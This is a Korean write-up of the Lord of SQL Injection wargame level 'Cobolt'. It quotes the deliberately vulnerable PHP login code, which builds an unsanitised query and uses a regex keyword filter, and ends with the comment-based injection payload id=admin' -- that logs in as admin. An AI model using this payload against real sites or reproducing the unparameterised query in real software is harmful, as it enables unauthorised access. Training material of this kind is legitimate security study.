# Lord of SQL Injection No.2 Cobolt

LOS Cobolt 문제는 SQL 삽입문을 이용하여 조건에 맞는 값을 넣어 문제를 해결할 수 있도록 유도한 문제이다.

### 소스 코드

cobolt 단계에서 문제를 해결해야 할 php 소스코드는 다음과 같다.
```php
<?php
  include "./config.php"; 
  login_chk();
  dbconnect();
  if(preg_match('/prob|_|\.|\(\)/i', $_GET[id])) exit("No Hack ~_~"); 
  if(preg_match('/prob|_|\.|\(\)/i', $_GET[pw])) exit("No Hack ~_~"); 
  $query = "select id from prob_cobolt where id='{$_GET[id]}' and pw=md5('{$_GET[pw]}')"; 
  echo "<hr>query : <strong>{$query}</strong><hr><br>"; 
  $result = @mysql_fetch_array(mysql_query($query)); 
  if($result['id'] == 'admin') solve("cobolt");
  elseif($result['id']) echo "<h2>Hello {$result['id']}<br>You are not admin :(</h2>"; 
  highlight_file(__FILE__); 
?>
```
## include
```php
<?php
  include "./config.php"; 
  login_chk();
  dbconnect();
  ...
  if($result['id'] == 'admin') solve("cobolt");
  ...
?>
```
PHP 코드 중 include 부문의 라인이다.
전 단계인 Gremlin과 동일하다.

```php
<?php
  ...
  $query = "select id from prob_cobolt where id='{$_GET[id]}' and pw=md5('{$_GET[pw]}')"; 
  echo "<hr>query : <strong>{$query}</strong><hr><br>"; 
  $result = @mysql_fetch_array(mysql_query($query)); 
  if($result['id'] == 'admin') solve("cobolt");
  elseif($result['id']) echo "<h2>Hello {$result['id']}<br>You are not admin :(</h2>"; 
  highlight_file(__FILE__); 
?>
```

Cobolt 문제가 Gremlin 단계에서 달라진 점은
```php
  $query = "select id from prob_cobolt where id='{$_GET[id]}' and pw=md5('{$_GET[pw]}')";
  ...
  if($result['id'] == 'admin') solve("cobolt");
  elseif($result['id']) exho "<h2>Hello {$result['id']}<br>You are not admin :(</h2>");
  ...
```
위의 부분이 달라졌다고 볼 수 있다.

## md5

`md5` 함수는 문자열에서 md5 해시값을 생성하여 암호화할 때 사용하는 함수이다.

* [php.net - md5 함수](http://php.net/manual/kr/function.md5.php)

#### 문제 해결 조건
```php
  if($result['id'] == 'admin') solve("cobolt");
  elseif($result['id']) echo "<h2>Hello {$result['id']}<br>You are not admin :(</h2>"; 
```
다음 코드를 보면 id 값을 입력 받았을 때 그 id 값이 `admin` 이라는 문자열과 일치하면 문제 풀이에 성공한다.

## Solution
```php
  if($result['id'] == 'admin') solve("cobolt");
```
입력받은 id값이 admin과 일치하면 문제풀이에 바로 성공하기 때문에 Gremlin에서 사용했던 "주석"을 이용하면 문제를 풀 수 있다.

```
http://los.eagle-jump.org/cobolt_***.php?id=admin' -- ;
```

문제 해결 조건에 충족하도록 id 값에 직접 `admin`을 입력해준 후 `--`로 뒤의 절들을 생략한다.